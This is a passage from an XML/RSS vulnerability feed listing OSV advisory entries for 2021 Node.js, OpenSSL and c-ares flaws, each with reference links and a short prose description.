                            <b>References:</b> <ul><li>- <a target='_blank' href='https://cert-portal.siemens.com/productcert/pdf/ssa-389290.pdf'>https://cert-portal.siemens.com/productcert/pdf/ssa-389290.pdf</a></li><li>- <a target='_blank' href='https://hackerone.com/reports/1211160'>https://hackerone.com/reports/1211160</a></li><li>- <a target='_blank' href='https://nodejs.org/en/blog/vulnerability/july-2021-security-releases/'>https://nodejs.org/en/blog/vulnerability/july-2021-security-releases/</a></li><li>- <a target='_blank' href='https://security.netapp.com/advisory/ntap-20210805-0003/'>https://security.netapp.com/advisory/ntap-20210805-0003/</a></li></ul><br>
                            <b>Details:</b> <b></b><br>Node.js before 16.4.1, 14.17.2, and 12.22.2 is vulnerable to local privilege escalation attacks under certain conditions on Windows platforms. More specifically, improper configuration of permissions in the installation directory allows an attacker to perform two different escalation attacks: PATH and DLL hijacking.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-node-min-2021-22930: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-node-min-2021-22930</link>
                    <pubDate>2024-12-16T14:05:28.026Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-node-min-2021-22930'>https://osv.dev/vulnerability/BIT-node-min-2021-22930</a><br>
                            <b>Published:</b> 2024-12-16T14:05:28.026Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://cert-portal.siemens.com/productcert/pdf/ssa-389290.pdf'>https://cert-portal.siemens.com/productcert/pdf/ssa-389290.pdf</a></li><li>- <a target='_blank' href='https://hackerone.com/reports/1238162'>https://hackerone.com/reports/1238162</a></li><li>- <a target='_blank' href='https://lists.debian.org/debian-lts-announce/2022/10/msg00006.html'>https://lists.debian.org/debian-lts-announce/2022/10/msg00006.html</a></li><li>- <a target='_blank' href='https://nodejs.org/en/blog/vulnerability/july-2021-security-releases-2/'>https://nodejs.org/en/blog/vulnerability/july-2021-security-releases-2/</a></li><li>- <a target='_blank' href='https://security.gentoo.org/glsa/202401-02'>https://security.gentoo.org/glsa/202401-02</a></li><li>- <a target='_blank' href='https://security.netapp.com/advisory/ntap-20211112-0002/'>https://security.netapp.com/advisory/ntap-20211112-0002/</a></li></ul><br>
                            <b>Details:</b> <b></b><br>Node.js before 16.6.0, 14.17.4, and 12.22.4 is vulnerable to a use after free attack where an attacker might be able to exploit the memory corruption, to change process behavior.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-node-min-2021-22931: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-node-min-2021-22931</link>
                    <pubDate>2024-12-16T14:05:15.223Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-node-min-2021-22931'>https://osv.dev/vulnerability/BIT-node-min-2021-22931</a><br>
                            <b>Published:</b> 2024-12-16T14:05:15.223Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://cert-portal.siemens.com/productcert/pdf/ssa-389290.pdf'>https://cert-portal.siemens.com/productcert/pdf/ssa-389290.pdf</a></li><li>- <a target='_blank' href='https://hackerone.com/reports/1178337'>https://hackerone.com/reports/1178337</a></li><li>- <a target='_blank' href='https://nodejs.org/en/blog/vulnerability/aug-2021-security-releases/'>https://nodejs.org/en/blog/vulnerability/aug-2021-security-releases/</a></li><li>- <a target='_blank' href='https://security.gentoo.org/glsa/202401-02'>https://security.gentoo.org/glsa/202401-02</a></li><li>- <a target='_blank' href='https://security.netapp.com/advisory/ntap-20210923-0001/'>https://security.netapp.com/advisory/ntap-20210923-0001/</a></li><li>- <a target='_blank' href='https://security.netapp.com/advisory/ntap-20211022-0003/'>https://security.netapp.com/advisory/ntap-20211022-0003/</a></li><li>- <a target='_blank' href='https://www.oracle.com/security-alerts/cpujan2022.html'>https://www.oracle.com/security-alerts/cpujan2022.html</a></li><li>- <a target='_blank' href='https://www.oracle.com/security-alerts/cpujul2022.html'>https://www.oracle.com/security-alerts/cpujul2022.html</a></li><li>- <a target='_blank' href='https://www.oracle.com/security-alerts/cpuoct2021.html'>https://www.oracle.com/security-alerts/cpuoct2021.html</a></li></ul><br>
                            <b>Details:</b> <b></b><br>Node.js before 16.6.0, 14.17.4, and 12.22.4 is vulnerable to Remote Code Execution, XSS, Application crashes due to missing input validation of host names returned by Domain Name Servers in Node.js dns library which can lead to output of wrong hostnames (leading to Domain Hijacking) and injection vulnerabilities in applications using the library.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-node-min-2021-22939: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-node-min-2021-22939</link>
                    <pubDate>2024-12-16T14:05:04.630Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-node-min-2021-22939'>https://osv.dev/vulnerability/BIT-node-min-2021-22939</a><br>
                            <b>Published:</b> 2024-12-16T14:05:04.630Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://cert-portal.siemens.com/productcert/pdf/ssa-389290.pdf'>https://cert-portal.siemens.com/productcert/pdf/ssa-389290.pdf</a></li><li>- <a target='_blank' href='https://hackerone.com/reports/1278254'>https://hackerone.com/reports/1278254</a></li><li>- <a target='_blank' href='https://lists.debian.org/debian-lts-announce/2022/10/msg00006.html'>https://lists.debian.org/debian-lts-announce/2022/10/msg00006.html</a></li><li>- <a target='_blank' href='https://nodejs.org/en/blog/vulnerability/aug-2021-security-releases/'>https://nodejs.org/en/blog/vulnerability/aug-2021-security-releases/</a></li><li>- <a target='_blank' href='https://security.gentoo.org/glsa/202401-02'>https://security.gentoo.org/glsa/202401-02</a></li><li>- <a target='_blank' href='https://security.netapp.com/advisory/ntap-20210917-0003/'>https://security.netapp.com/advisory/ntap-20210917-0003/</a></li><li>- <a target='_blank' href='https://www.oracle.com/security-alerts/cpujan2022.html'>https://www.oracle.com/security-alerts/cpujan2022.html</a></li><li>- <a target='_blank' href='https://www.oracle.com/security-alerts/cpujul2022.html'>https://www.oracle.com/security-alerts/cpujul2022.html</a></li><li>- <a target='_blank' href='https://www.oracle.com/security-alerts/cpuoct2021.html'>https://www.oracle.com/security-alerts/cpuoct2021.html</a></li></ul><br>
                            <b>Details:</b> <b></b><br>If the Node.js https API was used incorrectly and &quot;undefined&quot; was in passed for the &quot;rejectUnauthorized&quot; parameter, no error was returned and connections to servers with an expired certificate would have been accepted.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-node-min-2021-22940: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-node-min-2021-22940</link>
                    <pubDate>2024-12-16T14:04:54.112Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-node-min-2021-22940'>https://osv.dev/vulnerability/BIT-node-min-2021-22940</a><br>
                            <b>Published:</b> 2024-12-16T14:04:54.112Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://cert-portal.siemens.com/productcert/pdf/ssa-389290.pdf'>https://cert-portal.siemens.com/productcert/pdf/ssa-389290.pdf</a></li><li>- <a target='_blank' href='https://hackerone.com/reports/1238162'>https://hackerone.com/reports/1238162</a></li><li>- <a target='_blank' href='https://lists.debian.org/debian-lts-announce/2022/10/msg00006.html'>https://lists.debian.org/debian-lts-announce/2022/10/msg00006.html</a></li><li>- <a target='_blank' href='https://nodejs.org/en/blog/vulnerability/aug-2021-security-releases/'>https://nodejs.org/en/blog/vulnerability/aug-2021-security-releases/</a></li><li>- <a target='_blank' href='https://security.gentoo.org/glsa/202401-02'>https://security.gentoo.org/glsa/202401-02</a></li><li>- <a target='_blank' href='https://security.netapp.com/advisory/ntap-20210923-0001/'>https://security.netapp.com/advisory/ntap-20210923-0001/</a></li><li>- <a target='_blank' href='https://www.oracle.com/security-alerts/cpujan2022.html'>https://www.oracle.com/security-alerts/cpujan2022.html</a></li><li>- <a target='_blank' href='https://www.oracle.com/security-alerts/cpujul2022.html'>https://www.oracle.com/security-alerts/cpujul2022.html</a></li><li>- <a target='_blank' href='https://www.oracle.com/security-alerts/cpuoct2021.html'>https://www.oracle.com/security-alerts/cpuoct2021.html</a></li></ul><br>
                            <b>Details:</b> <b></b><br>Node.js before 16.6.1, 14.17.5, and 12.22.5 is vulnerable to a use after free attack where an attacker might be able to exploit the memory corruption, to change process behavior.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-node-min-2021-23840: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-node-min-2021-23840</link>
                    <pubDate>2024-12-16T14:04:42.614Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-node-min-2021-23840'>https://osv.dev/vulnerability/BIT-node-min-2021-23840</a><br>
                            <b>Published:</b> 2024-12-16T14:04:42.614Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://cert-portal.siemens.com/productcert/pdf/ssa-389290.pdf'>https://cert-portal.siemens.com/productcert/pdf/ssa-389290.pdf</a></li><li>- <a target='_blank' href='https://git.openssl.org/gitweb/?p=openssl.git%3Ba=commitdiff%3Bh=6a51b9e1d0cf0bf8515f7201b68fb0a3482b3dc1'>https://git.openssl.org/gitweb/?p=openssl.git%3Ba=commitdiff%3Bh=6a51b9e1d0cf0bf8515f7201b68fb0a3482b3dc1</a></li><li>- <a target='_blank' href='https://git.openssl.org/gitweb/?p=openssl.git%3Ba=commitdiff%3Bh=9b1129239f3ebb1d1c98ce9ed41d5c9476c47cb2'>https://git.openssl.org/gitweb/?p=openssl.git%3Ba=commitdiff%3Bh=9b1129239f3ebb1d1c98ce9ed41d5c9476c47cb2</a></li><li>- <a target='_blank' href='https://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44846'>https://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44846</a></li><li>- <a target='_blank' href='https://kc.mcafee.com/corporate/index?page=content&id=SB10366'>https://kc.mcafee.com/corporate/index?page=content&id=SB10366</a></li><li>- <a target='_blank' href='https://lists.apache.org/thread.html/r58af02e294bd07f487e2c64ffc0a29b837db5600e33b6e698b9d696b%40%3Cissues.bookkeeper.apache.org%3E'>https://lists.apache.org/thread.html/r58af02e294bd07f487e2c64ffc0a29b837db5600e33b6e698b9d696b%40%3Cissues.bookkeeper.apache.org%3E</a></li><li>- <a target='_blank' href='https://lists.apache.org/thread.html/rf4c02775860db415b4955778a131c2795223f61cb8c6a450893651e4%40%3Cissues.bookkeeper.apache.org%3E'>https://lists.apache.org/thread.html/rf4c02775860db415b4955778a131c2795223f61cb8c6a450893651e4%40%3Cissues.bookkeeper.apache.org%3E</a></li><li>- <a target='_blank' href='https://security.gentoo.org/glsa/202103-03'>https://security.gentoo.org/glsa/202103-03</a></li><li>- <a target='_blank' href='https://security.netapp.com/advisory/ntap-20210219-0009/'>https://security.netapp.com/advisory/ntap-20210219-0009/</a></li><li>- <a target='_blank' href='https://security.netapp.com/advisory/ntap-20240621-0006/'>https://security.netapp.com/advisory/ntap-20240621-0006/</a></li><li>- <a target='_blank' href='https://www.debian.org/security/2021/dsa-4855'>https://www.debian.org/security/2021/dsa-4855</a></li><li>- <a target='_blank' href='https://www.openssl.org/news/secadv/20210216.txt'>https://www.openssl.org/news/secadv/20210216.txt</a></li><li>- <a target='_blank' href='https://www.oracle.com//security-alerts/cpujul2021.html'>https://www.oracle.com//security-alerts/cpujul2021.html</a></li><li>- <a target='_blank' href='https://www.oracle.com/security-alerts/cpuApr2021.html'>https://www.oracle.com/security-alerts/cpuApr2021.html</a></li><li>- <a target='_blank' href='https://www.oracle.com/security-alerts/cpuapr2022.html'>https://www.oracle.com/security-alerts/cpuapr2022.html</a></li><li>- <a target='_blank' href='https://www.oracle.com/security-alerts/cpujan2022.html'>https://www.oracle.com/security-alerts/cpujan2022.html</a></li><li>- <a target='_blank' href='https://www.oracle.com/security-alerts/cpuoct2021.html'>https://www.oracle.com/security-alerts/cpuoct2021.html</a></li><li>- <a target='_blank' href='https://www.tenable.com/security/tns-2021-03'>https://www.tenable.com/security/tns-2021-03</a></li><li>- <a target='_blank' href='https://www.tenable.com/security/tns-2021-09'>https://www.tenable.com/security/tns-2021-09</a></li><li>- <a target='_blank' href='https://www.tenable.com/security/tns-2021-10'>https://www.tenable.com/security/tns-2021-10</a></li></ul><br>
                            <b>Details:</b> <b></b><br>Calls to EVP_CipherUpdate, EVP_EncryptUpdate and EVP_DecryptUpdate may overflow the output length argument in some cases where the input length is close to the maximum permissable length for an integer on the platform. In such cases the return value from the function call will be 1 (indicating success), but the output length value will be negative. This could cause applications to behave incorrectly or crash. OpenSSL versions 1.1.1i and below are affected by this issue. Users of these versions should upgrade to OpenSSL 1.1.1j. OpenSSL versions 1.0.2x and below are affected by this issue. However OpenSSL 1.0.2 is out of support and no longer receiving public updates. Premium support customers of OpenSSL 1.0.2 should upgrade to 1.0.2y. Other users should upgrade to 1.1.1j. Fixed in OpenSSL 1.1.1j (Affected 1.1.1-1.1.1i). Fixed in OpenSSL 1.0.2y (Affected 1.0.2-1.0.2x).
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-node-min-2021-3449: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-node-min-2021-3449</link>
                    <pubDate>2024-12-16T14:04:32.813Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-node-min-2021-3449'>https://osv.dev/vulnerability/BIT-node-min-2021-3449</a><br>
                            <b>Published:</b> 2024-12-16T14:04:32.813Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='http://www.openwall.com/lists/oss-security/2021/03/27/1'>http://www.openwall.com/lists/oss-security/2021/03/27/1</a></li><li>- <a target='_blank' href='http://www.openwall.com/lists/oss-security/2021/03/27/2'>http://www.openwall.com/lists/oss-security/2021/03/27/2</a></li><li>- <a target='_blank' href='http://www.openwall.com/lists/oss-security/2021/03/28/3'>http://www.openwall.com/lists/oss-security/2021/03/28/3</a></li><li>- <a target='_blank' href='http://www.openwall.com/lists/oss-security/2021/03/28/4'>http://www.openwall.com/lists/oss-security/2021/03/28/4</a></li><li>- <a target='_blank' href='https://cert-portal.siemens.com/productcert/pdf/ssa-389290.pdf'>https://cert-portal.siemens.com/productcert/pdf/ssa-389290.pdf</a></li><li>- <a target='_blank' href='https://cert-portal.siemens.com/productcert/pdf/ssa-772220.pdf'>https://cert-portal.siemens.com/productcert/pdf/ssa-772220.pdf</a></li><li>- <a target='_blank' href='https://git.openssl.org/gitweb/?p=openssl.git%3Ba=commitdiff%3Bh=fb9fa6b51defd48157eeb207f52181f735d96148'>https://git.openssl.org/gitweb/?p=openssl.git%3Ba=commitdiff%3Bh=fb9fa6b51defd48157eeb207f52181f735d96148</a></li><li>- <a target='_blank' href='https://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44845'>https://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44845</a></li><li>- <a target='_blank' href='https://kc.mcafee.com/corporate/index?page=content&id=SB10356'>https://kc.mcafee.com/corporate/index?page=content&id=SB10356</a></li><li>- <a target='_blank' href='https://lists.debian.org/debian-lts-announce/2021/08/msg00029.html'>https://lists.debian.org/debian-lts-announce/2021/08/msg00029.html</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/CCBFLLVQVILIVGZMBJL3IXZGKWQISYNP/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/CCBFLLVQVILIVGZMBJL3IXZGKWQISYNP/</a></li><li>- <a target='_blank' href='https://psirt.global.sonicwall.com/vuln-detail/SNWLID-2021-0013'>https://psirt.global.sonicwall.com/vuln-detail/SNWLID-2021-0013</a></li><li>- <a target='_blank' href='https://security.FreeBSD.org/advisories/FreeBSD-SA-21:07.openssl.asc'>https://security.FreeBSD.org/advisories/FreeBSD-SA-21:07.openssl.asc</a></li><li>- <a target='_blank' href='https://security.gentoo.org/glsa/202103-03'>https://security.gentoo.org/glsa/202103-03</a></li><li>- <a target='_blank' href='https://security.netapp.com/advisory/ntap-20210326-0006/'>https://security.netapp.com/advisory/ntap-20210326-0006/</a></li><li>- <a target='_blank' href='https://security.netapp.com/advisory/ntap-20210513-0002/'>https://security.netapp.com/advisory/ntap-20210513-0002/</a></li><li>- <a target='_blank' href='https://security.netapp.com/advisory/ntap-20240621-0006/'>https://security.netapp.com/advisory/ntap-20240621-0006/</a></li><li>- <a target='_blank' href='https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-openssl-2021-GHY28dJd'>https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-openssl-2021-GHY28dJd</a></li><li>- <a target='_blank' href='https://www.debian.org/security/2021/dsa-4875'>https://www.debian.org/security/2021/dsa-4875</a></li><li>- <a target='_blank' href='https://www.openssl.org/news/secadv/20210325.txt'>https://www.openssl.org/news/secadv/20210325.txt</a></li><li>- <a target='_blank' href='https://www.oracle.com//security-alerts/cpujul2021.html'>https://www.oracle.com//security-alerts/cpujul2021.html</a></li><li>- <a target='_blank' href='https://www.oracle.com/security-alerts/cpuApr2021.html'>https://www.oracle.com/security-alerts/cpuApr2021.html</a></li><li>- <a target='_blank' href='https://www.oracle.com/security-alerts/cpuapr2022.html'>https://www.oracle.com/security-alerts/cpuapr2022.html</a></li><li>- <a target='_blank' href='https://www.oracle.com/security-alerts/cpujul2022.html'>https://www.oracle.com/security-alerts/cpujul2022.html</a></li><li>- <a target='_blank' href='https://www.oracle.com/security-alerts/cpuoct2021.html'>https://www.oracle.com/security-alerts/cpuoct2021.html</a></li><li>- <a target='_blank' href='https://www.tenable.com/security/tns-2021-05'>https://www.tenable.com/security/tns-2021-05</a></li><li>- <a target='_blank' href='https://www.tenable.com/security/tns-2021-06'>https://www.tenable.com/security/tns-2021-06</a></li><li>- <a target='_blank' href='https://www.tenable.com/security/tns-2021-09'>https://www.tenable.com/security/tns-2021-09</a></li><li>- <a target='_blank' href='https://www.tenable.com/security/tns-2021-10'>https://www.tenable.com/security/tns-2021-10</a></li></ul><br>
                            <b>Details:</b> <b></b><br>An OpenSSL TLS server may crash if sent a maliciously crafted renegotiation ClientHello message from a client. If a TLSv1.2 renegotiation ClientHello omits the signature_algorithms extension (where it was present in the initial ClientHello), but includes a signature_algorithms_cert extension then a NULL pointer dereference will result, leading to a crash and a denial of service attack. A server is only vulnerable if it has TLSv1.2 and renegotiation enabled (which is the default configuration). OpenSSL TLS clients are not impacted by this issue. All OpenSSL 1.1.1 versions are affected by this issue. Users of these versions should upgrade to OpenSSL 1.1.1k. OpenSSL 1.0.2 is not impacted by this issue. Fixed in OpenSSL 1.1.1k (Affected 1.1.1-1.1.1j).
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-node-min-2021-3450: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-node-min-2021-3450</link>
                    <pubDate>2024-12-16T14:04:21.219Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-node-min-2021-3450'>https://osv.dev/vulnerability/BIT-node-min-2021-3450</a><br>
                            <b>Published:</b> 2024-12-16T14:04:21.219Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='http://www.openwall.com/lists/oss-security/2021/03/27/1'>http://www.openwall.com/lists/oss-security/2021/03/27/1</a></li><li>- <a target='_blank' href='http://www.openwall.com/lists/oss-security/2021/03/27/2'>http://www.openwall.com/lists/oss-security/2021/03/27/2</a></li><li>- <a target='_blank' href='http://www.openwall.com/lists/oss-security/2021/03/28/3'>http://www.openwall.com/lists/oss-security/2021/03/28/3</a></li><li>- <a target='_blank' href='http://www.openwall.com/lists/oss-security/2021/03/28/4'>http://www.openwall.com/lists/oss-security/2021/03/28/4</a></li><li>- <a target='_blank' href='https://cert-portal.siemens.com/productcert/pdf/ssa-389290.pdf'>https://cert-portal.siemens.com/productcert/pdf/ssa-389290.pdf</a></li><li>- <a target='_blank' href='https://git.openssl.org/gitweb/?p=openssl.git%3Ba=commitdiff%3Bh=2a40b7bc7b94dd7de897a74571e7024f0cf0d63b'>https://git.openssl.org/gitweb/?p=openssl.git%3Ba=commitdiff%3Bh=2a40b7bc7b94dd7de897a74571e7024f0cf0d63b</a></li><li>- <a target='_blank' href='https://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44845'>https://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44845</a></li><li>- <a target='_blank' href='https://kc.mcafee.com/corporate/index?page=content&id=SB10356'>https://kc.mcafee.com/corporate/index?page=content&id=SB10356</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/CCBFLLVQVILIVGZMBJL3IXZGKWQISYNP/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/CCBFLLVQVILIVGZMBJL3IXZGKWQISYNP/</a></li><li>- <a target='_blank' href='https://mta.openssl.org/pipermail/openssl-announce/2021-March/000198.html'>https://mta.openssl.org/pipermail/openssl-announce/2021-March/000198.html</a></li><li>- <a target='_blank' href='https://psirt.global.sonicwall.com/vuln-detail/SNWLID-2021-0013'>https://psirt.global.sonicwall.com/vuln-detail/SNWLID-2021-0013</a></li><li>- <a target='_blank' href='https://security.FreeBSD.org/advisories/FreeBSD-SA-21:07.openssl.asc'>https://security.FreeBSD.org/advisories/FreeBSD-SA-21:07.openssl.asc</a></li><li>- <a target='_blank' href='https://security.gentoo.org/glsa/202103-03'>https://security.gentoo.org/glsa/202103-03</a></li><li>- <a target='_blank' href='https://security.netapp.com/advisory/ntap-20210326-0006/'>https://security.netapp.com/advisory/ntap-20210326-0006/</a></li><li>- <a target='_blank' href='https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-openssl-2021-GHY28dJd'>https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-openssl-2021-GHY28dJd</a></li><li>- <a target='_blank' href='https://www.openssl.org/news/secadv/20210325.txt'>https://www.openssl.org/news/secadv/20210325.txt</a></li><li>- <a target='_blank' href='https://www.oracle.com//security-alerts/cpujul2021.html'>https://www.oracle.com//security-alerts/cpujul2021.html</a></li><li>- <a target='_blank' href='https://www.oracle.com/security-alerts/cpuApr2021.html'>https://www.oracle.com/security-alerts/cpuApr2021.html</a></li><li>- <a target='_blank' href='https://www.oracle.com/security-alerts/cpuapr2022.html'>https://www.oracle.com/security-alerts/cpuapr2022.html</a></li><li>- <a target='_blank' href='https://www.oracle.com/security-alerts/cpujul2022.html'>https://www.oracle.com/security-alerts/cpujul2022.html</a></li><li>- <a target='_blank' href='https://www.oracle.com/security-alerts/cpuoct2021.html'>https://www.oracle.com/security-alerts/cpuoct2021.html</a></li><li>- <a target='_blank' href='https://www.tenable.com/security/tns-2021-05'>https://www.tenable.com/security/tns-2021-05</a></li><li>- <a target='_blank' href='https://www.tenable.com/security/tns-2021-08'>https://www.tenable.com/security/tns-2021-08</a></li><li>- <a target='_blank' href='https://www.tenable.com/security/tns-2021-09'>https://www.tenable.com/security/tns-2021-09</a></li></ul><br>
                            <b>Details:</b> <b></b><br>The X509_V_FLAG_X509_STRICT flag enables additional security checks of the certificates present in a certificate chain. It is not set by default. Starting from OpenSSL version 1.1.1h a check to disallow certificates in the chain that have explicitly encoded elliptic curve parameters was added as an additional strict check. An error in the implementation of this check meant that the result of a previous check to confirm that certificates in the chain are valid CA certificates was overwritten. This effectively bypasses the check that non-CA certificates must not be able to issue other certificates. If a &quot;purpose&quot; has been configured then there is a subsequent opportunity for checks that the certificate is a valid CA. All of the named &quot;purpose&quot; values implemented in libcrypto perform this check. Therefore, where a purpose is set the certificate chain will still be rejected even when the strict flag has been used. A purpose is set by default in libssl client and server certificate verification routines, but it can be overridden or removed by an application. In order to be affected, an application must explicitly set the X509_V_FLAG_X509_STRICT verification flag and either not set a purpose for the certificate verification or, in the case of TLS client or server applications, override the default purpose. OpenSSL versions 1.1.1h and newer are affected by this issue. Users of these versions should upgrade to OpenSSL 1.1.1k. OpenSSL 1.0.2 is not impacted by this issue. Fixed in OpenSSL 1.1.1k (Affected 1.1.1h-1.1.1j).
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-node-min-2021-3672: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-node-min-2021-3672</link>
                    <pubDate>2024-12-16T14:04:10.126Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-node-min-2021-3672'>https://osv.dev/vulnerability/BIT-node-min-2021-3672</a><br>
                            <b>Published:</b> 2024-12-16T14:04:10.126Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://bugzilla.redhat.com/show_bug.cgi?id=1988342'>https://bugzilla.redhat.com/show_bug.cgi?id=1988342</a></li><li>- <a target='_blank' href='https://c-ares.haxx.se/adv_20210810.html'>https://c-ares.haxx.se/adv_20210810.html</a></li><li>- <a target='_blank' href='https://cert-portal.siemens.com/productcert/pdf/ssa-389290.pdf'>https://cert-portal.siemens.com/productcert/pdf/ssa-389290.pdf</a></li><li>- <a target='_blank' href='https://security.gentoo.org/glsa/202401-02'>https://security.gentoo.org/glsa/202401-02</a></li><li>- <a target='_blank' href='https://www.oracle.com/security-alerts/cpujul2022.html'>https://www.oracle.com/security-alerts/cpujul2022.html</a></li></ul><br>
                            <b>Details:</b> <b></b><br>A flaw was found in c-ares library, where a missing input validation check of host names returned by DNS (Domain Name Servers) can lead to output of wrong hostnames which might potentially lead to Domain Hijacking. The highest threat from this vulnerability is to confidentiality and integrity as well as system availability.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-node-min-2021-44531: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-node-min-2021-44531</link>
                    <pubDate>2024-12-16T14:03:48.419Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-node-min-2021-44531'>https://osv.dev/vulnerability/BIT-node-min-2021-44531</a><br>
                            <b>Published:</b> 2024-12-16T14:03:48.419Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://hackerone.com/reports/1429694'>https://hackerone.com/reports/1429694</a></li><li>- <a target='_blank' href='https://nodejs.org/en/blog/vulnerability/jan-2022-security-releases/'>https://nodejs.org/en/blog/vulnerability/jan-2022-security-releases/</a></li><li>- <a target='_blank' href='https://security.netapp.com/advisory/ntap-20220325-0007/'>https://security.netapp.com/advisory/ntap-20220325-0007/</a></li><li>- <a target='_blank' href='https://www.debian.org/security/2022/dsa-5170'>https://www.debian.org/security/2022/dsa-5170</a></li><li>- <a target='_blank' href='https://www.oracle.com/security-alerts/cpuapr2022.html'>https://www.oracle.com/security-alerts/cpuapr2022.html</a></li><li>- <a target='_blank' href='https://www.oracle.com/security-alerts/cpujul2022.html'>https://www.oracle.com/security-alerts/cpujul2022.html</a></li></ul><br>
                            <b>Details:</b> <b></b><br>Accepting arbitrary Subject Alternative Name (SAN) types, unless a PKI is specifically defined to use a particular SAN type, can result in bypassing name-constrained intermediates. Node.js &amp;lt; 12.22.9, &amp;lt; 14.18.3, &amp;lt; 16.13.2, and &amp;lt; 17.3.1 was accepting URI SAN types, which PKIs are often not defined to use. Additionally, when a protocol allows URI SANs, Node.js did not match the URI correctly.Versions of Node.js with the fix for this disable the URI SAN type when checking a certificate against a hostname. This behavior can be reverted through the --security-revert command-line option.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-node-min-2021-44532: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-node-min-2021-44532</link>
                    <pubDate>2024-12-16T14:03:38.227Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-node-min-2021-44532'>https://osv.dev/vulnerability/BIT-node-min-2021-44532</a><br>
                            <b>Published:</b> 2024-12-16T14:03:38.227Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://hackerone.com/reports/1429694'>https://hackerone.com/reports/1429694</a></li><li>- <a target='_blank' href='https://nodejs.org/en/blog/vulnerability/jan-2022-security-releases/'>https://nodejs.org/en/blog/vulnerability/jan-2022-security-releases/</a></li><li>- <a target='_blank' href='https://security.netapp.com/advisory/ntap-20220325-0007/'>https://security.netapp.com/advisory/ntap-20220325-0007/</a></li><li>- <a target='_blank' href='https://www.debian.org/security/2022/dsa-5170'>https://www.debian.org/security/2022/dsa-5170</a></li><li>- <a target='_blank' href='https://www.oracle.com/security-alerts/cpuapr2022.html'>https://www.oracle.com/security-alerts/cpuapr2022.html</a></li><li>- <a target='_blank' href='https://www.oracle.com/security-alerts/cpujul2022.html'>https://www.oracle.com/security-alerts/cpujul2022.html</a></li></ul><br>
